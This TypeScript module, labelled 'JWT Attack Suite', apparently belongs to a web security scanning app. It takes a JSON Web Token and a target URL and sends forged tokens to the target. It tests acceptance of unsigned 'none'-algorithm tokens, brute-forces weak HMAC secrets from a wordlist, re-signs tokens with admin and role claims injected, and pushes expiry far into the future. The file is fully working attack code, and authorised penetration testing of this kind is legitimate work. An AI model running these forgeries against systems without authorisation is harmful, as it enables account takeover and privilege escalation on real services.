// JWT attack suite — TS port of app/modules/jwt_audit.py (dropped ghostx-web
// project). Uses the `jsonwebtoken` package already a dependency of this app
// (src/lib/security.ts) instead of the CLI toolkit's external jwt_tool.
//
// `target` is the URL to replay forged tokens against (also what the scope
// gate checks); the token under test is passed as params.token.

import jwt from "jsonwebtoken";
import { JobContext, ModuleMeta, safeFetch, validateTargetUrl } from "./base";
import { JWT_WEAK_SECRETS } from "./jwtWordlist";

export const meta: ModuleMeta = {
  id: "jwt_audit",
  name: "JWT Attack Suite",
  description: "Tests none-alg bypass, weak HMAC secrets, claim tampering, and expiry bypass.",
  riskTier: "active",
};

const ROLE_PAYLOADS: Array<[string, string | boolean]> = [
  ["role", "admin"], ["role", "administrator"], ["is_admin", true],
  ["isAdmin", true], ["admin", true], ["user_type", "admin"],
  ["privilege", "admin"], ["scope", "admin"], ["group", "admin"],
];

function b64urlDecode(segment: string): Record<string, unknown> {
  const padded = segment + "=".repeat((4 - (segment.length % 4)) % 4);
  const json = Buffer.from(padded, "base64url").toString("utf-8");
  return JSON.parse(json);
}

function b64urlEncode(obj: unknown): string {
  return Buffer.from(JSON.stringify(obj)).toString("base64url").replace(/=+$/, "");
}

function unsignedNoneToken(header: Record<string, unknown>, payload: Record<string, unknown>): string {
  const h = { ...header, alg: "none" };
  return `${b64urlEncode(h)}.${b64urlEncode(payload)}.`;
}

async function tryRequest(url: string, token: string, ctx: JobContext): Promise<number | null> {
  const resp = await safeFetch(url, ctx, { headers: { Authorization: `Bearer ${token}` } });
  return resp ? resp.status : null;
}

export async function* run(
  targetRaw: string,
  params: Record<string, string>,
  ctx: JobContext
): AsyncGenerator<string> {
  const target = validateTargetUrl(targetRaw);
  const token = (params.token ?? "").trim();
  if (!token || token.split(".").length !== 3) {
    yield "[ERR] params.token must be a JWT (header.payload.signature)";
    return;
  }

  const [headerSeg, payloadSeg] = token.split(".");

  yield "=== GHOST JWT ATTACKER ===";
  yield `Token: ${token.slice(0, 50)}...`;
  yield `Target: ${target}`;
  yield "===========================";

  let header: Record<string, unknown>;
  let payload: Record<string, unknown>;
  try {
    header = b64urlDecode(headerSeg);
    payload = b64urlDecode(payloadSeg);
  } catch (exc) {
    yield `[ERR] Could not decode token: ${exc}`;
    return;
  }

  const alg = String(header.alg ?? "unknown");
  yield "";
  yield "[*] Step 1: Decoded token";
  yield `    Algorithm: ${alg}`;
  yield `    Header: ${JSON.stringify(header)}`;
  yield `    Payload: ${JSON.stringify(payload)}`;

  const findings: Array<Record<string, unknown>> = [];

  // Step 2: none-algorithm bypass
  yield "";
  yield "[*] Step 2: Testing 'none' algorithm bypass";
  const noneToken = unsignedNoneToken(header, payload);
  let status = await tryRequest(target, noneToken, ctx);
  if (status === 200) {
    yield "[VULN] None algorithm ACCEPTED! Server accepted an unsigned token.";
    findings.push({ severity: "CRITICAL", check: "none_alg", status });
  } else {
    yield `[OK] None algorithm rejected (HTTP ${status}) — good`;
  }

  // Step 3: weak secret brute force (HMAC algs only)
  yield "";
  yield "[*] Step 3: Brute-forcing JWT secret";
  let secretFound: string | null = null;
  if (alg.toUpperCase().startsWith("HS")) {
    yield `    Testing ${JWT_WEAK_SECRETS.length} candidate secrets`;
    for (const candidate of JWT_WEAK_SECRETS) {
      try {
        jwt.verify(token, candidate, { algorithms: [alg as jwt.Algorithm] });
        secretFound = candidate;
        break;
      } catch {
        continue;
      }
    }
    if (secretFound) {
      yield `[VULN] JWT secret found: '${secretFound}'`;
      findings.push({ severity: "CRITICAL", check: "weak_secret", secret: secretFound });
    } else {
      yield "[OK] No weak secret found with bundled wordlist";
    }
  } else {
    yield `    Skipped — ${alg} is not HMAC, brute force doesn't apply`;
  }

  // Step 4: role/privilege escalation
  yield "";
  yield "[*] Step 4: Testing role/privilege escalation";
  for (const [claim, value] of ROLE_PAYLOADS) {
    const modifiedPayload = { ...payload, [claim]: value };
    const forged = secretFound
      ? jwt.sign(modifiedPayload, secretFound, { algorithm: alg as jwt.Algorithm, noTimestamp: true })
      : unsignedNoneToken(header, modifiedPayload);
    status = await tryRequest(target, forged, ctx);
    if (status === 200) {
      yield `[VULN] Escalation ACCEPTED: ${claim}=${value} (HTTP ${status})`;
      findings.push({ severity: "CRITICAL", check: "role_escalation", claim, value });
    }
  }

  // Step 5: expiration bypass
  yield "";
  yield "[*] Step 5: Testing expiration bypass";
  const expiredPayload = { ...payload, exp: 99999999999 };
  const forgedExp = secretFound
    ? jwt.sign(expiredPayload, secretFound, { algorithm: alg as jwt.Algorithm, noTimestamp: true })
    : unsignedNoneToken(header, expiredPayload);
  status = await tryRequest(target, forgedExp, ctx);
  if (status === 200) {
    yield "[VULN] Expiration bypass works!";
    findings.push({ severity: "HIGH", check: "exp_bypass", status });
  } else {
    yield `[OK] Expiration properly enforced (HTTP ${status})`;
  }

  ctx.result.findings = findings;
  yield "";
  yield "===========================";
  yield findings.length > 0
    ? `[VULN] ${findings.length} finding(s) — see structured results`
    : "[OK] JWT implementation appears secure against tested attacks";
}
